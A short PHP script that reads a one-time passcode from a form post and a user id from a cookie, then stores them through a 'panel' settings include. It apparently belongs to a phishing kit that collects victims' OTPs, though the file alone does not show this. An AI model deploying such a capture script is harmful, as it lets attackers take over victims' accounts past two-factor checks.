<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$otp = $ifilter->process($_POST['otp']);

$id = $_COOKIE['id'];
put_otp($id,$otp);
?>